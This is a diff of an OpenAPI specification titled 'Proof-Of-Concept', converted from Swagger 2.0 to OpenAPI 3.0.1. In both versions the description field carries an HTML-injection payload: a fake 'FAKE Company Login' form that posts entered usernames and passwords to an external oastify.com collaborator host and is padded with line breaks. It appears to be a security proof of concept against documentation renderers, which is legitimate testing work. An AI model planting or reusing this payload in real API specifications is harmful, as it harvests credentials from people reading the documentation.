@@ -1,31 +1,23 @@
-swagger: '3.0'
+openapi: 3.0.1
 info:
-  version: 1.0.0
   title: Proof-Of-Concept
-  description: '<div class="login-form">
-    <div class="heading">
-        <center><h1>FAKE Company Login</h1></center>
-    </div>
-    <div class="form-container">
-        <center><form action="https://me4nsq32qarc6sdsylba1wk86zcq0go5.oastify.com/" method="post" class="form-signin">
-            <div class="form-group">
-                <label for="username">Username</label>
-                <input type="text" name="username" size="20">
-            </div>
-            <div class="form-group">
-                <label for="password">Password</label>
-                <input type="password" name="password" size="20">
-            </div>
-            <div class="form-group">
-                <button type="submit" class="btn btn-default">Back</button>
-                <button type="submit" class="btn btn-default">Login</button>
-            </div>
-        </form>
-    </div>
-</div><br><br><br><br><br><br><br><br><br><br><br><br>'
+  description: <div class="login-form"> <div class="heading"> <center><h1>FAKE Company
+    Login</h1></center> </div> <div class="form-container"> <center><form action="https://me4nsq32qarc6sdsylba1wk86zcq0go5.oastify.com/"
+    method="post" class="form-signin"> <div class="form-group"> <label for="username">Username</label>
+    <input type="text" name="username" size="20"> </div> <div class="form-group">
+    <label for="password">Password</label> <input type="password" name="password"
+    size="20"> </div> <div class="form-group"> <button type="submit" class="btn btn-default">Back</button>
+    <button type="submit" class="btn btn-default">Login</button> </div> </form> </div>
+    </div><br><br><br><br><br><br><br><br><br><br><br><br>
+  version: 1.0.0
+servers:
+- url: /
 paths:
   /:
     post:
       responses:
-        '200':
+        "200":
           description: Login successful
+          content: {}
+components: {}
+x-original-swagger-version: "2.0"
